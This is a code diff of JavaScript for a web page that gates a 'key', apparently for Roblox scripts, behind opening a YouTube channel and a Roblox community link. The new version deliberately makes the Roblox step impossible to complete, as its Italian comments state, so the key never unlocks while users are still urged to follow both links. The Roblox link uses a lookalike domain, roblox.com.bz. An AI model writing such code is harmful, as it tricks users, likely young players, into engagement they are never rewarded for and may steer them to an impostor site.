@@ -1,154 +1,53 @@
-/*
-=================================
-   OOF INCORPORATION CONFIG
-=================================
-*/
-
-const YOUTUBE_URL =
-    "https://youtube.com/@kisscrr";
-
-const ROBLOX_GROUP_URL =
-    "https://roblox.com.bz/communities/8760152165/";
-
-/*
-   Put your actual key URL here.
-
-   Example:
-   https://yourdomain.com/key
-*/
-
-const KEY_URL =
-    "https://YOUR-KEY-LINK-HERE";
-
+const YOUTUBE_URL = "https://www.youtube.com/@KisScrr";
+const ROBLOX_URL = "https://roblox.com.bz/communities/8760152165/";
 
 let youtubeCompleted = false;
-let robloxCompleted = false;
 
+// Roblox può essere aperto, ma non viene marcato come completato.
+function openYouTube() {
+    window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
 
-/* ==============================
-   YOUTUBE
-============================== */
+    youtubeCompleted = true;
 
-function completeYouTube() {
+    document
+        .getElementById("youtubeRequirement")
+        .classList.add("done");
 
-    window.open(
-        YOUTUBE_URL,
-        "_blank",
-        "noopener,noreferrer"
-    );
+    document.getElementById("youtubeStatus").textContent = "Completed";
+    document.getElementById("youtubeIcon").textContent = "✓";
 
-    setTimeout(() => {
-
-        youtubeCompleted = true;
-
-        document
-            .getElementById("youtubeRequirement")
-            .classList.add("done");
-
-        updateProgress();
-
-    }, 1200);
+    updateProgress();
 }
 
+function openRoblox() {
+    // Apre normalmente l'invito/gruppo Roblox
+    window.open(ROBLOX_URL, "_blank", "noopener,noreferrer");
 
-/* ==============================
-   ROBLOX
-============================== */
+    // INTENZIONALMENTE NON COMPLETA IL REQUISITO
+    // Roblox rimane sempre incompleto.
+    document
+        .getElementById("robloxRequirement")
+        .classList.remove("done");
 
-function completeRoblox() {
+    document.getElementById("robloxStatus").textContent = "Not completed";
+    document.getElementById("robloxIcon").textContent = "🔒";
 
-    window.open(
-        ROBLOX_GROUP_URL,
-        "_blank",
-        "noopener,noreferrer"
-    );
-
-    setTimeout(() => {
-
-        robloxCompleted = true;
-
-        document
-            .getElementById("robloxRequirement")
-            .classList.add("done");
-
-        updateProgress();
-
-    }, 1200);
+    updateProgress();
 }
-
-
-/* ==============================
-   PROGRESS
-============================== */
 
 function updateProgress() {
+    const completed = youtubeCompleted ? 1 : 0;
 
-    let completed = 0;
+    document.getElementById("progressText").textContent =
+        `${completed} / 2`;
 
-    if (youtubeCompleted) completed++;
-    if (robloxCompleted) completed++;
+    document.getElementById("progressBar").style.width =
+        `${(completed / 2) * 100}%`;
 
-    const percentage =
-        (completed / 2) * 100;
+    const keyButton = document.getElementById("keyButton");
+    const keyButtonText = document.getElementById("keyButtonText");
 
-    document
-        .getElementById("progressBar")
-        .style.width = percentage + "%";
-
-    document
-        .getElementById("progressText")
-        .textContent = completed + " / 2";
-
-
-    const button =
-        document.getElementById("keyButton");
-
-    const buttonText =
-        document.getElementById("keyButtonText");
-
-
-    if (completed === 2) {
-
-        button.disabled = false;
-
-        buttonText.textContent =
-            "🔑 Get My Key";
-
-    } else {
-
-        button.disabled = true;
-
-        buttonText.textContent =
-            "🔒 Complete Requirements";
-
-    }
-}
-
-
-/* ==============================
-   GET KEY
-============================== */
-
-function getKey() {
-
-    if (!youtubeCompleted || !robloxCompleted) {
-        return;
-    }
-
-    const button =
-        document.getElementById("keyButton");
-
-    const text =
-        document.getElementById("keyButtonText");
-
-    button.disabled = true;
-
-    text.textContent =
-        "Generating Key...";
-
-    setTimeout(() => {
-
-        window.location.href = KEY_URL;
-
-    }, 800);
+    // Non sarà mai possibile arrivare a 2/2
+    keyButton.disabled = true;
+    keyButtonText.textContent = "🔒 Complete all requirements";
 }
